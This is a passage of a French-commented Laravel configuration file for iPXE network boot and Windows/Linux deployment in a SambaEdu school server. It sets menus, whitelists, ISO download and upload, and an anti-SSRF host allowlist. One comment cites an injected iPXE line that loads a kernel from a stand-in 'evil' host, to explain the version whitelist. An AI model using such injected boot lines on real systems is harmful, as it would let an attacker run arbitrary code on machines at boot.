<?php

declare(strict_types=1);

/**
 * Story 3.1 — D11.
 *
 * Configuration du domaine iPXE (boot réseau + déploiement OS).
 *
 * Pattern iso `config/auth_v1.php` (16.10) + `config/scriptsos.php` (16.12)
 * + `config/parc.php` — un fichier de config par domaine fonctionnel,
 * override-able via `.env`.
 *
 * **Aucun secret** : pas de mot de passe ni de token signé ici (un firmware
 * iPXE ne porte pas de credentials — la sécurité est portée par le
 * middleware `auth.v1.lan-only` D3).
 */
return [
    /*
    |--------------------------------------------------------------------------
    | Nom DNS du SE4FS
    |--------------------------------------------------------------------------
    |
    | Utilisé pour la construction des URLs `chain` dans les templates iPXE.
    | Fallback : valeur de `sambaedu.se4fs_name` (legacy config) → `se4fs`.
    |
    */
    'se4fs_name' => env('IPXE_SE4FS_NAME', config('sambaedu.se4fs_name', 'se4fs')),

    /*
    |--------------------------------------------------------------------------
    | URL de base du SE4FS (override optionnel)
    |--------------------------------------------------------------------------
    |
    | Si non vide, force l'URL de base utilisée par les `chain --replace`
    | (ex. `http://192.168.122.50` ou `http://se4fs.lan`). Sinon, le service
    | reconstruit l'URL depuis le `Request` reçu (Host + scheme).
    |
    | Cas d'usage : si le SE4FS est derrière un reverse proxy qui réécrit
    | l'Host header, on peut forcer l'URL canonique ici.
    |
    */
    'se4fs_url' => env('IPXE_SE4FS_URL', ''),

    /*
    |--------------------------------------------------------------------------
    | Paramètres du menu iPXE
    |--------------------------------------------------------------------------
    */
    'menu' => [
        // Timeout par défaut pour les postes connus (5s — iso-legacy boot.php:45).
        'default_timeout_ms' => (int) env('IPXE_DEFAULT_TIMEOUT_MS', 5000),

        // Timeout pour les postes inconnus (10s — iso-legacy boot.php:58 —
        // laisse plus de temps au user pour interrompre le boot disk).
        'unknown_timeout_ms' => (int) env('IPXE_UNKNOWN_TIMEOUT_MS', 10000),

        // Résolution console iPXE.
        'resolution_x' => (int) env('IPXE_RESOLUTION_X', 1024),
        'resolution_y' => (int) env('IPXE_RESOLUTION_Y', 768),

        // Background PNG affiché par la console iPXE.
        //
        // **Path absolu obligatoire** (préfixé `/`) : avec un path relatif,
        // iPXE résolvait l'URL par rapport au chain courant, ce qui cassait
        // sur les routes de profondeur >1 (ex: `/ipxe/enrollment/name` →
        // résolu en `/ipxe/enrollment/png/...` → 404 → `console --picture`
        // failure → iPXE quitte le script → UEFI tombe en boot loop).
        'background_png' => env('IPXE_BACKGROUND_PNG', '/ipxe/png/ipxe-se4.png'),
    ],

    /*
    |--------------------------------------------------------------------------
    | Fallback boot disk
    |--------------------------------------------------------------------------
    |
    | Liste des modèles matériel (valeur de la variable iPXE `${product}`) qui
    | doivent **forcer** le branchement UEFI dans `boot_disk` même quand
    | `${platform}` n'est pas `efi`. Liste iso-legacy
    | `sambaedu/includes/ipxe_functions.inc.php:18-32`.
    |
    | **Source de vérité unique** : ce fichier. L'override via env n'est PAS
    | supporté (fix review #7 / Q2 Henri) — l'ancien `(array) env(...)`
    | cassait le parsing CSV en singleton inutilisable. Pour ajouter un
    | modèle, éditer ce tableau directement. Si un besoin opérationnel
    | d'override env apparaît, parser via `explode(',', ...)`.
    |
    */
    'boot_disk' => [
        'force_uefi_products' => [
            'Precision T1700',
            'Precision Tower 3620',
            'Precision Tower 3420',
            'OptiPlex 3050',
            'OptiPlex 3010',
            'OptiPlex 3020',
            'OptiPlex 3030',
            'OptiPlex 3040',
            'HP Z240 Tower Workstation',
            'HP 280 G2 SFF',
            'HP EliteBook 850 G1',
            '10M8S1B000',
            '30AT0025FR',
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Logging
    |--------------------------------------------------------------------------
    |
    | Channel Monolog dédié pour les événements iPXE (D7).
    | Configuration dans `config/logging.php` channel `ipxe`.
    |
    */
    'log' => [
        'channel' => env('IPXE_LOG_CHANNEL', 'ipxe'),
    ],

    /*
    |--------------------------------------------------------------------------
    | Story 3.2 — Menu admin natif (D10)
    |--------------------------------------------------------------------------
    |
    | Paramètres rendus dans `resources/views/ipxe/menu/admin.blade.php`.
    | Timeout par défaut iso-legacy `sambaedu/ipxe/admin.php:14` (30s).
    */
    'admin' => [
        // Story 4.10 — kill-switch retiré, default `true` désormais.
        // L'auth iPXE (validatePassword AD + permission Spatie
        // `computer.install`) est portée par `IpxeAuthService::authorize()`
        // côté serveur (cf. `IpxeService::handleAdmin()`). Le menu boot
        // `known.blade.php` affiche TOUJOURS l'item `(1) login` — toute
        // tentative d'accès sans creds valides reçoit l'écran iPXE
        // `auth_failed.blade.php`.
        // Conserver le flag pour permettre une désactivation explicite
        // (`IPXE_ADMIN_ENABLED=false`) en cas de panne LDAP rare.
        'enabled' => (bool) env('IPXE_ADMIN_ENABLED', true),
        'menu_timeout_ms' => (int) env('IPXE_ADMIN_TIMEOUT_MS', 30000),
    ],

    /*
    |--------------------------------------------------------------------------
    | Story 3.2 — Menu maintenance natif (D10)
    |--------------------------------------------------------------------------
    |
    | Paramètres rendus dans `resources/views/ipxe/menu/maintenance.blade.php`.
    | Timeout iso-legacy `sambaedu/ipxe/maintenance.php:9` (10s).
    | Background PNG iso-legacy `maintenance.php:24` (`png/sysrescuecd.png`).
    */
    'maintenance' => [
        'menu_timeout_ms' => (int) env('IPXE_MAINTENANCE_TIMEOUT_MS', 10000),
        'background_png' => env('IPXE_MAINTENANCE_BG_PNG', '/ipxe/png/sysrescuecd.png'),
    ],

    /*
    |--------------------------------------------------------------------------
    | Story 3.2 — Actions whitelistées (D10)
    |--------------------------------------------------------------------------
    |
    | URLs de base utilisées par les templates `ipxe.actions.*` pour
    | construire les `kernel` / `initrd` lignes. Si `null`/`''`, le service
    | `IpxeActionResolver` reconstruit depuis `Request::getSchemeAndHttpHost()`
    | suffixé `/ipxe` (parité legacy `admin.php:12`).
    |
    | `os_url`     → base des assets OS (sysresccd, clonezilla, Win10...).
    | `script_url` → base des scripts dynamiques (autorun.php, repair.bat.php).
    | `se4install_passwd_config_key` → clé config qui héberge le mot de passe
    |                                  root sysrescuecd (iso-legacy `actions/rescuecd.php:6`).
    |                                  Lecture via `config(<clé>)` côté serveur
    |                                  uniquement, jamais dans les logs.
    */
    /*
    |--------------------------------------------------------------------------
    | Story 3.3 — Enrollment Machine (D11)
    |--------------------------------------------------------------------------
    |
    | Paramètres pour les 5 endpoints `/ipxe/enrollment/*` (name, byod, room,
    | parc-add, parc-remove) — port natif des fichiers legacy
    | `sambaedu/ipxe/{enregistrement,enregistrement_byod,salles,parcs,enleveparc}.php`.
    |
    | Le suffix de hostname iso-legacy (`add_hostname_suffix()`) reste lu
    | via `config('sambaedu.legacy_ldap.suffix')` qui existe depuis 16.3b
    | — pas de duplication ici.
    */
    'enrollment' => [
        // Active la branche enrollment depuis le menu admin (3.3). Si false,
        // l'item `(n)` nommer / `(a)` salle / `(p)` parcs est masqué — utile
        // pour freezer une VM de tests en pré-prod.
        'enabled' => filter_var(env('IPXE_ENROLLMENT_ENABLED', true), FILTER_VALIDATE_BOOL),

        // Timeout des menus enrollment (10s — iso-legacy salles.php:15).
        'menu_timeout_ms' => (int) env('IPXE_ENROLLMENT_TIMEOUT_MS', 10000),

        // Limite de salles physiques affichées dans le menu interactif
        // (cas pathologique > 50 salles). Au-delà, on tronque + affiche un
        // item "** voir UI admin SE5 **" (placeholder Phase 3).
        'max_rooms_in_menu' => (int) env('IPXE_ENROLLMENT_MAX_ROOMS', 50),

        // Limite de parcs logiques affichés idem.
        'max_parcs_in_menu' => (int) env('IPXE_ENROLLMENT_MAX_PARCS', 50),
    ],

    'actions' => [
        'os_url' => env('IPXE_OS_URL', null),
        'script_url' => env('IPXE_SCRIPT_URL', null),

        /*
        |----------------------------------------------------------------------
        | Assets d'installation OS servis par Laravel (route /ipxe/os/{path})
        |----------------------------------------------------------------------
        |
        | Remplace les `Alias` Apache par-emplacement (non versionnes) : la
        | route `GET /ipxe/os/{path}` (cf. IpxeOsAssetController) sert les
        | binaires d'install OS depuis ces racines whitelistees. Ajouter un
        | emplacement = editer ce tableau (versionne), pas Apache.
        |
        | `roots` : repertoires autorises, testes dans l'ordre (1er match).
        | `xsendfile_enabled` : si mod_xsendfile est actif cote Apache, mettre
        |   IPXE_OS_ASSETS_XSENDFILE=true -> Apache sert les octets (pas de
        |   streaming PHP-FPM). Defaut false = streaming (marche sans module,
        |   suffisant hors boot de masse).
        |
        */
        'os_assets' => [
            'roots' => array_values(array_filter([
                env('IPXE_OS_ASSETS_ROOT', '/var/sambaedu/unattended/install/os'),
            ], static fn ($p): bool => (string) $p !== '')),
            // Defaut true : sur SE5, `scripts/setupXsendfile.sh` (appele par
            // install.sh) installe mod_xsendfile + pose XSendFile/XSendFilePath.
            // Apache sert alors les octets nativement (sendfile) — pas de
            // streaming PHP-FPM (qui bloquait a 99% sur l'initrd ~355 Mo).
            'xsendfile_enabled' => filter_var(env('IPXE_OS_ASSETS_XSENDFILE', true), FILTER_VALIDATE_BOOL),
            'xsendfile_header' => env('IPXE_OS_ASSETS_XSENDFILE_HEADER', 'X-Sendfile'),
        ],
        // IMPORTANT: `se4install_passwd` (lu via `config(<clé>)`) doit rester
        // ASCII-safe (pas d'espace, pas de newline, idéalement uniquement
        // `[A-Za-z0-9._-]`). La valeur est injectée brute dans la cmdline
        // kernel iPXE `rootpass=...` — un espace ou un newline casserait le
        // parsing iPXE et rescuecd booterait sans mot de passe root sans
        // erreur visible (fix review #4 / pertinence opus 1). Pas de
        // sanitisation côté code (doc only — la config admin est trusted
        // boundary).
        'se4install_passwd_config_key' => env('IPXE_SE4INSTALL_PASSWD_KEY', 'sambaedu.se4install_passwd'),

        /*
        |--------------------------------------------------------------------------
        | Story 3.2 — Action `winpe` (fix review #2 / Q2 Henri)
        |--------------------------------------------------------------------------
        |
        | Whitelist stricte des valeurs `$version` autorisées dans la cmdline
        | iPXE rendue par `actions/winpe.blade.php`. La liste DOIT rester
        | ASCII strict (`[A-Za-z0-9]+`) — un newline/espace dans une valeur
        | permet une injection iPXE (newline → ligne `kernel http://evil/x`
        | exécutée par le firmware). Toute valeur reçue hors whitelist est
        | rejetée côté FormRequest (422) ET côté resolver (fallback
        | `DEFAULT_WIN_VERSION='Win11'` — défense en profondeur si
        | FormRequest court-circuitée par les tests).
        |
        | Pour ajouter une version (Win12), éditer ce tableau ET le folder
        | servi via Apache (`Win12/wimboot`, `Win12/winpeshl.ini`...).
        |
        */
        'winpe' => [
            'allowed_versions' => ['Win10', 'Win11'],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Story 3.4 — Installation Linux (D11)
    |--------------------------------------------------------------------------
    |
    | Paramètres pour les 4 endpoints `/ipxe/installation-linux`,
    | `/ipxe/linux/{preseed,action,autorun}` — port natif des fichiers legacy
    | `sambaedu/ipxe/installation-linux.php` + `linux/*.php` +
    | `actions/{deb_*,ubuntu64,nird}.php`.
    */
    'linux' => [
        // Active la branche Installation Linux depuis le menu admin (3.4).
        // Si false, l'item (l) Installation Linux est masqué dans /ipxe/admin.
        'enabled' => filter_var(env('IPXE_INSTALL_LINUX_ENABLED', true), FILTER_VALIDATE_BOOL),

        // Timeout du menu installation-linux (10s — iso-legacy installation-linux.php:9).
        'menu_timeout_ms' => (int) env('IPXE_INSTALL_LINUX_TIMEOUT_MS', 10000),

        // Fix install-debian — compte à rebours (ms) de l'écran one-shot
        // « installation Linux terminée » affiché au 1er boot post-install,
        // avant boot automatique du disque local (defaut 10s).
        'post_install_countdown_ms' => (int) env('IPXE_LINUX_POST_INSTALL_COUNTDOWN_MS', 10000),

        // Background PNG affiché par la console iPXE du menu installation-linux.
        'background_png' => env('IPXE_INSTALL_LINUX_BG_PNG', '/ipxe/png/linux2.png'),

        // Variante par défaut sélectionnée (iso-legacy installation-linux.php:29).
        'default_variant' => env('IPXE_INSTALL_LINUX_DEFAULT', 'install_deb_gnome'),

        // Liste des items menu (whitelist enum + labels iPXE-safe ASCII).
        // Pour ajouter/retirer un item, éditer ce tableau + le case enum
        // correspondant dans IpxeAdminAction.
        'menu_items' => [
            ['enum' => 'install_deb_base',     'label' => 'Debian base (sans desktop)'],
            ['enum' => 'install_deb_gnome',    'label' => 'Debian + GNOME (defaut)'],
            ['enum' => 'install_deb_lxde',     'label' => 'Debian + LXDE'],
            ['enum' => 'install_deb_kde',      'label' => 'Debian + KDE'],
            ['enum' => 'install_deb_mate',     'label' => 'Debian + MATE'],
            ['enum' => 'install_deb_xfce',     'label' => 'Debian + XFCE'],
            ['enum' => 'install_deb_cinnamon', 'label' => 'Debian + Cinnamon'],
            ['enum' => 'install_nird',         'label' => 'NIRD (Debian derivee primaire)'],
            ['enum' => 'install_ubuntu64',     'label' => 'Ubuntu 20.04 (hors domaine)'],
        ],

        // Préfixe URL des assets debian-installer/ubuntu-installer servis via
        // l'OS_URL résolu (cf. config/ipxe.php section actions).
        // Iso-legacy `actions/deb_*.php:8` : `{os_url}/debian-installer/amd64/linux`.
        'kernel_paths' => [
            'debian' => env('IPXE_LINUX_DEBIAN_KERNEL', '/debian-installer/amd64/linux'),
            'debian_initrd' => env('IPXE_LINUX_DEBIAN_INITRD', '/debian-installer/amd64/initrd.gz'),
            'ubuntu' => env('IPXE_LINUX_UBUNTU_KERNEL', '/ubuntu-installer/amd64/linux'),
            'ubuntu_initrd' => env('IPXE_LINUX_UBUNTU_INITRD', '/ubuntu-installer/amd64/initrd.gz'),
            'nird' => env('IPXE_LINUX_NIRD_KERNEL', '/nird/casper/vmlinuz'),
            'nird_initrd' => env('IPXE_LINUX_NIRD_INITRD', '/nird/casper/initrd.gz'),
        ],

        // Chemin du dossier de fragments preseed (assets statiques projet).
        // Décision D11 — copier les fragments depuis sambaedu/ipxe/linux/*.cfg
        // vers resources/ipxe/linux/*.cfg pour mise sous version control.
        'preseed_fragments_path' => env(
            'IPXE_LINUX_PRESEED_FRAGMENTS',
            resource_path('ipxe/linux'),
        ),

        // Whitelist stricte des distributions acceptées par /ipxe/linux/preseed.
        // Cf. enum LinuxDistribution.
        'allowed_distributions' => ['debian', 'ubuntu', 'nird'],

        // Whitelist stricte des variantes desktop acceptées par
        // /ipxe/linux/preseed. Cf. enum LinuxDesktopVariant.
        'allowed_variants' => ['base', 'gnome', 'lxde', 'kde', 'mate', 'xfce', 'cinnamon'],

        // Whitelist stricte des versions Debian/Ubuntu acceptées (au-delà,
        // fallback config('sambaedu.linux.version_debian') par défaut).
        // Pour ajouter une version, éditer ici ET les assets servis par Apache.
        'allowed_os_versions' => [
            'debian', 'ubuntu', 'nird',
            'trixie', 'bookworm', 'bullseye',
            'focal', 'jammy',
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Story 3.5 — Installation Windows (D11)
    |--------------------------------------------------------------------------
    |
    | Paramètres pour les 6 endpoints `/ipxe/installation-windows`,
    | `/ipxe/windows/{install.bat,unattend.xml,diskpart.txt,sysprep.xml,action}`
    | — port natif des fichiers legacy `sambaedu/ipxe/installation-windows.php`,
    | `Win10/install.bat.php`, `Win10/unattend.xml.php`, `Win10/diskpart.php`,
    | `Win10/sysprep.xml.php` (stub), `Win10/action.php` (partiel winpe/oobe).
    */
    'windows' => [
        // Active la branche Installation Windows depuis le menu admin (3.5).
        // Si false, l'item (w) Installation Windows est masqué dans /ipxe/admin.
        'enabled' => filter_var(env('IPXE_INSTALL_WINDOWS_ENABLED', true), FILTER_VALIDATE_BOOL),

        // Timeout du menu installation-windows (10s — iso-legacy
        // installation-windows.php:9).
        'menu_timeout_ms' => (int) env('IPXE_INSTALL_WIN_TIMEOUT_MS', 10000),

        // Background PNG affiché par la console iPXE (iso-legacy
        // installation-windows.php:24 qui sert windows11.png — windows10.png
        // n'existe plus dans les assets png/ ; un 404 faisait avorter le menu
        // iPXE avant la garde `||`, éjectant le poste du flow natif).
        'background_png' => env('IPXE_INSTALL_WIN_BG_PNG', '/ipxe/png/windows11.png'),

        // Variante par défaut sélectionnée (iso-legacy
        // installation-windows.php:28 — install Win11 auto).
        'default_variant' => env('IPXE_INSTALL_WIN_DEFAULT', 'install_win11'),

        // Liste des 7 items menu (whitelist enum + labels iPXE-safe ASCII).
        // Pour ajouter/retirer un item, éditer ce tableau + le case enum
        // correspondant dans IpxeAdminAction.
        'menu_items' => [
            ['enum' => 'install_win10',       'label' => 'Installation de Windows 10 (auto)'],
            ['enum' => 'install_win10_debug', 'label' => 'Installation W10 en mode debug des drivers'],
            ['enum' => 'install_win10_disk',  'label' => 'Installation W10 avec choix du partitionnement (double boot)'],
            ['enum' => 'install_win10_perso', 'label' => 'Installation W10 pour pc perso (hors domaine)'],
            ['enum' => 'install_win11',       'label' => 'Installation de Windows 11 (auto - defaut)'],
            ['enum' => 'install_win11_disk',  'label' => 'Installation W11 avec choix du partitionnement'],
            ['enum' => 'install_win11_perso', 'label' => 'Installation W11 pour pc perso (hors domaine)'],
        ],

        // Whitelist stricte des versions acceptées par
        // /ipxe/windows/{install.bat,unattend.xml,diskpart.txt}.
        // Cf. enum WindowsVersion.
        'allowed_versions' => ['Win10', 'Win11'],

        // Assets WinPE servis aux postes via la route `/ipxe/os/{path}`
        // (IpxeOsAssetController + X-Sendfile), sous `deployed_os_base_path`.
        //
        // `wimboot_base` : sous-dossier (sous `/ipxe/os/`) des helpers WinPE
        // partagés Win10/Win11 — `wimboot` (chargeur iPXE, version-agnostique)
        // + `winpeshl.ini`. Historiquement `Win10` (parité legacy
        // `wimboot10.php:6`/`wimboot11.php:6` `kernel Win10/wimboot`, fournis
        // par le paquet SE4 `sambaedu-client-windows`). Déplacés hors `Win10/`
        // vers un dossier neutre `winpe` (direction SE5-autonome
        // [[project_windows_install_helpers_oem_staging]]) : ils ne sont plus
        // livrés par le deb mais semés par WindowsIsoExtractor à l'extraction
        // depuis `winpe_source_path`. Le resolver bâtit l'URL
        // `<osUrl>/<wimboot_base>/wimboot` (= `/ipxe/os/winpe/wimboot`).
        //
        // `winpe_source_path` : dossier SOURCE versionné des helpers WinPE,
        // copié dans `{deployed_os_base_path}/<wimboot_base>/` à chaque
        // extraction. Le passage par le tree `/os` (au lieu d'un service direct
        // depuis `resources/`) est imposé par `XSendFilePath` Apache, confiné à
        // `deployed_os_base_path` (cf. scripts/setupXsendfile.sh).
        'assets_paths' => [
            'wimboot_base' => env('IPXE_WIN_WIMBOOT_BASE', 'winpe'),
            'winpe_source_path' => env('IPXE_WIN_WINPE_SOURCE', resource_path('ipxe/winpe')),
            // Sous-chemins versionnés BCD/boot.sdi/boot.wim, relatifs à
            // `<osUrl>/<version>` (documentaires : les templates les codent en
            // dur — `{{ $winVersionBase }}/sources/boot.wim` etc.).
            'bcd' => env('IPXE_WIN_BCD_PATH', '{version}/boot/bcd'),
            'boot_sdi' => env('IPXE_WIN_BOOT_SDI_PATH', '{version}/boot/boot.sdi'),
            'boot_wim' => env('IPXE_WIN_BOOT_WIM_PATH', '{version}/sources/boot.wim'),
        ],

        // Chemin du template unattend.xml (asset projet sous version control).
        // Décision D11 — copier le template depuis sambaedu/ipxe/Win10/unattend.xml
        // vers resources/ipxe/windows/unattend.xml pour mise sous VC.
        'unattend_template_path' => env(
            'IPXE_WIN_UNATTEND_TEMPLATE',
            resource_path('ipxe/windows/unattend.xml'),
        ),

        /*
        |--------------------------------------------------------------------------
        | Story 3.8 — D13 / AC9.1 — Post-OOBE flows (sysprep/nosysprep/join/
        | renomme/post/wpkg)
        |--------------------------------------------------------------------------
        |
        | Toggle global + flags par étape pour rollback rapide en cas de
        | régression terrain :
        |   - `IPXE_WIN_POST_INSTALL_ENABLED=false` → comportement 3.5 (body
        |     vide + log warning step_disabled). Les postes pré-3.5 continuent
        |     via fallback `direct_legacy_routes ^/ipxe/` (D-A12).
        |   - Flags individuels désactivent une étape spécifique (granularité
        |     fine pour rollback sur 1 flow en cas de bug terrain).
        |
        | Note : winpe + oobe restent toujours actifs (comportement 3.5 préservé
        | strict — pas de toggle car ce sont les flows critiques d'install
        | initiale).
        */
        'post_install' => [
            'enabled' => filter_var(env('IPXE_WIN_POST_INSTALL_ENABLED', true), FILTER_VALIDATE_BOOL),
            'sysprep_enabled' => filter_var(env('IPXE_WIN_SYSPREP_ENABLED', true), FILTER_VALIDATE_BOOL),
            'nosysprep_enabled' => filter_var(env('IPXE_WIN_NOSYSPREP_ENABLED', true), FILTER_VALIDATE_BOOL),
            'join_enabled' => filter_var(env('IPXE_WIN_JOIN_ENABLED', true), FILTER_VALIDATE_BOOL),
            'renomme_enabled' => filter_var(env('IPXE_WIN_RENOMME_ENABLED', true), FILTER_VALIDATE_BOOL),
            'post_enabled' => filter_var(env('IPXE_WIN_POST_ENABLED', true), FILTER_VALIDATE_BOOL),
            'wpkg_enabled' => filter_var(env('IPXE_WIN_WPKG_ENABLED', true), FILTER_VALIDATE_BOOL),
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Story 3.6 — Gestion ISO Windows (D11)
    |--------------------------------------------------------------------------
    |
    | Paramètres de la page admin web SE5 `/admin/ipxe/iso-windows` qui porte
    | nativement `sambaedu/ipxe/Win10/win_iso.php`. Cette section configure
    | la double validation URL (anti-SSRF allowlist host Microsoft) + le Job
    | Laravel Queue qui exécute `curl` + `sudo install-win-iso.sh` + le lock
    | global Cache::lock (1 instance vivante max).
    |
    | Tous les paths sont overridables via `.env` pour les environnements de
    | test (où l'on ne veut pas écrire dans `/var/sambaedu/...`).
    */
    'iso_management' => [
        // Master switch — si false, la page Livewire renvoie un message
        // explicite "fonctionnalité désactivée" + le bouton de submit est
        // masqué. Utile pour freezer la VM en pré-prod le temps de poser
        // sudoers + worker queue.
        'enabled' => filter_var(env('IPXE_ISO_MANAGEMENT_ENABLED', true), FILTER_VALIDATE_BOOL),

        // Racine des dossiers `Win{10,11}{,-old}/` extraits par
        // install-win-iso.sh — servie aux postes via `/os` (route
        // `/ipxe/os/{path}` + X-Sendfile). Exception client-facing : RESTE
        // hors `storage/` (cf. convention storage non-versionné).
        'deployed_os_base_path' => env('IPXE_ISO_DEPLOYED_OS_BASE', '/var/sambaedu/unattended/install/os'),

        // Stockage des ISO *sources* (déposées par upload ou téléchargées par
        // curl) AVANT extraction. Déplacé sous `storage/` (convention des
        // assets non-versionnés) — n'est plus un sous-dossier du tree `/os`
        // servi aux postes. Servi en HTTP par l'alias Apache `/install/iso`
        // (cf. scripts/setupApache.sh) pour accès/vérification manuels — aucun
        // flux d'install ne consomme l'ISO brute (les postes lisent les
        // dossiers Win extraits sous `deployed_os_base_path`).
        'iso_storage_path'      => env('IPXE_ISO_STORAGE_PATH', storage_path('install/iso')),

        // Nom du fichier "version" qui contient le nom de l'iso source
        // ("Win11_24H2.iso") — écrit par install-win-iso.sh après extraction.
        'version_file_name' => env('IPXE_ISO_VERSION_FILE', 'version'),

        // --- Story 3.10 — Injection pilotes NIC dans le boot.wim WinPE -------
        //
        // Pack de pilotes WinPE (NIC) injecté à CHAQUE extraction d'ISO dans le
        // `boot.wim` cible par {@see App\Ipxe\Iso\Services\WinpeDriverInjector}.
        // Corrige la régression 3.6 (l'extraction écrase le boot.wim par le
        // stock Microsoft → toute injection one-shot DISM est perdue). L'idempo-
        // tence est garantie *par construction* : la copie fraîche du boot.wim
        // depuis l'ISO (cp -R) donne toujours un wim pristine avant injection.
        //
        // ⚠ Ce pack est **server-side UNIQUEMENT** : il est lu par
        // `wimlib-imagex` (user www-admin) au moment de l'extraction ; les
        // POSTES ne le téléchargent JAMAIS (ils reçoivent un boot.wim avec les
        // pilotes déjà injectés). D'où le placement sous `storage/` (convention
        // assets non-versionnés NON client-facing — cf.
        // [[project_storage_convention_non_versioned]]) plutôt que sous `/os`.
        // INVARIANT : il DOIT vivre HORS `{deployed_os_base_path}/Win{N}` pour
        // échapper au `sudo rm -rf <target>` de l'extraction (persistance).
        // Pour reproduire exactement le PoC (pack sous /os), poser :
        //   IPXE_WINPE_DRIVERS_PATH=/var/sambaedu/unattended/install/os/winpe-drivers
        //
        // Structure attendue : `winpe_drivers_path/<famille>/` (ex.
        // `intel-i219/`) contenant les triplets `.inf` + `.sys` + `.cat`.
        // Plusieurs familles peuvent coexister (chacune injectée à
        // `\drivers\<famille>` dans le wim).
        //
        // Prérequis système (provisioning, action Henri / one-shot-install) :
        //   - `wimtools` (fournit `wimlib-imagex`) — injection, en www-admin
        //     SANS sudo (le boot.wim lui appartient déjà après le chown de
        //     l'extraction).
        //   - `innoextract` — ingestion des `.exe` InnoSetup Lenovo.
        //   - `unzip` — ingestion des `.zip` Intel.
        'winpe_drivers_path' => env('IPXE_WINPE_DRIVERS_PATH', storage_path('install/winpe-drivers')),

        // ⚠ PIÈGE INDEX 2. Sur un média d'install Windows, le `boot.wim`
        // contient 2 images : index 1 = « Windows Setup », index 2 = WinPE
        // bootable. Injecter les pilotes sur l'index 1 ne charge RIEN au boot —
        // ils doivent aller sur l'index BOOTABLE 2 (validé PoC ; rendu
        // configurable par prudence).
        'winpe_boot_wim_image_index' => (int) env('IPXE_WINPE_BOOT_WIM_INDEX', 2),

        // Allowlist anti-SSRF — host de l'URL Microsoft saisie par l'admin.
        // CSV via env, sinon défauts iso-projet (3 hostnames Microsoft connus
        // pour servir les ISO en direct + sous-domaines via str_ends_with()).
        //
        // **Anti-pattern strict** : ne PAS étendre cette liste à `microsoft.com`
        // bare — un attaquant qui compromet une sous-page `microsoft.com/foo.iso`
        // pourrait pousser un fake ISO.
        // `download.prss.microsoft.com` matche (via str_ends_with) les
        // sous-domaines `software.download.prss.…` ET `software-static.download.prss.…`
        // (Microsoft a basculé de l'un à l'autre courant 2026).
        'allowed_url_hosts' => explode(',', (string) env(
            'IPXE_ISO_ALLOWED_HOSTS',
            'download.prss.microsoft.com,software-download.microsoft.com,download.microsoft.com',
        )),

        // Timeouts process (secondes) — passés en arg `--max-time` à curl
        // et `Process::timeout()` côté Job.
        'download_timeout_seconds' => (int) env('IPXE_ISO_DOWNLOAD_TIMEOUT', 7200),  // 2h curl
        'extract_timeout_seconds'  => (int) env('IPXE_ISO_EXTRACT_TIMEOUT', 1800),   // 30min install-win-iso.sh

        // Nom de la queue Laravel. Les uploads d'ISO étant rares et le Job
        // portant son propre `$timeout` (download + extract ~9300s), on le
        // route sur la queue `default` déjà consommée par les workers systemd
        // (laravel-queue-worker / laravel-queue-general) plutôt que de
        // maintenir un worker dédié `ipxe_iso_downloads`.
        'queue_name' => env('IPXE_ISO_QUEUE', 'default'),

        // Cache::lock global (D15) — defense in depth couche 1 vs
        // `WithoutOverlapping` Job middleware couche 2.
        // TTL aligné sur curl 7200 + marge.
        'global_lock_key' => env('IPXE_ISO_LOCK_KEY', 'ipxe.iso.download.global'),
        'global_lock_ttl' => (int) env('IPXE_ISO_LOCK_TTL', 7200),

        // Store du lock global. Le cache par défaut est APCu (`apc`) qui NE
        // supporte PAS `Cache::lock()` (« undefined method ApcStore::lock() »)
        // ET est per-process (invisible entre PHP-FPM et le worker). On force
        // donc un store partagé lock-capable — `file` par défaut, convention
        // iso `App\SystemStatus\DistroInstallTracker`. `database` est aussi un
        // choix valide (QUEUE_CONNECTION=database déjà en place).
        'lock_store' => env('IPXE_ISO_LOCK_STORE', 'file'),

        // Nombre de rows historiques affichées dans la card "Historique".
        'history_limit' => (int) env('IPXE_ISO_HISTORY_LIMIT', 10),

        // --- Dépôt manuel d'ISO (upload chunké) -----------------------------
        //
        // En plus du téléchargement par URL (curl serveur), l'admin peut
        // déposer une ISO depuis son navigateur. L'uploader découpe le fichier
        // en chunks (POST raw octet-stream) pour supporter des ISO de plusieurs
        // Go SANS lever `upload_max_filesize`/`post_max_size` à 4G+ et avec
        // reprise en cas de coupure. Le serveur réassemble en `.part` dans
        // `upload_tmp_path` puis renomme atomiquement (même filesystem que
        // `iso_storage_path`) avant de lancer l'extraction.

        // Master switch dédié à l'upload (indépendant du flux URL).
        'upload_enabled' => filter_var(env('IPXE_ISO_UPLOAD_ENABLED', true), FILTER_VALIDATE_BOOL),

        // Dossier de réassemblage des chunks. DOIT être sur le même filesystem
        // que `iso_storage_path` (rename atomique, pas de copie 2× l'espace
        // disque) et writable par le user PHP-FPM (www-admin). Niché sous
        // `iso_storage_path` mais NON exposé en HTTP (deny dans l'alias Apache
        // `/install/iso`) — ce sont des `.part`/`.json` partiels.
        'upload_tmp_path' => env('IPXE_ISO_UPLOAD_TMP', storage_path('install/iso/.uploads')),

        // Taille d'un chunk (octets). Défaut 5 Mo : tient sous le
        // `post_max_size` stock PHP (8M) en raw body — fonctionne sans toucher
        // la config serveur. Monter cette valeur (+ `post_max_size`) réduit le
        // nombre de round-trips sur les gros fichiers. Le front lit cette
        // valeur (injectée dans le blade) — pas de drift client/serveur.
        'upload_chunk_bytes' => (int) env('IPXE_ISO_UPLOAD_CHUNK_BYTES', 5 * 1024 * 1024),

        // Taille totale max d'une ISO déposée (octets). Défaut 10 Go (marge
        // au-dessus des ISO Win10/Win11 multi-langue ~7,5 Go).
        'upload_max_total_bytes' => (int) env('IPXE_ISO_UPLOAD_MAX_BYTES', 10 * 1024 * 1024 * 1024),

        // TTL (secondes) avant purge d'un upload partiel abandonné dans
        // `upload_tmp_path` (nettoyé best-effort au démarrage d'un nouvel
        // upload). Défaut 24h.
        'upload_stale_ttl' => (int) env('IPXE_ISO_UPLOAD_STALE_TTL', 86400),
    ],

    /*
    |--------------------------------------------------------------------------
    | Story 3.7 — Sous-menu Clonezilla (D8)
    |--------------------------------------------------------------------------
    */
    'clonezilla' => [
        'enabled' => filter_var(env('IPXE_CLONEZILLA_ENABLED', true), FILTER_VALIDATE_BOOL),
        'menu_timeout_ms' => (int) env('IPXE_CLONEZILLA_TIMEOUT_MS', 10000),
        'background_png' => env('IPXE_CLONEZILLA_BG_PNG', '/ipxe/png/clonezilla.png'),
    ],

    /*
    |--------------------------------------------------------------------------
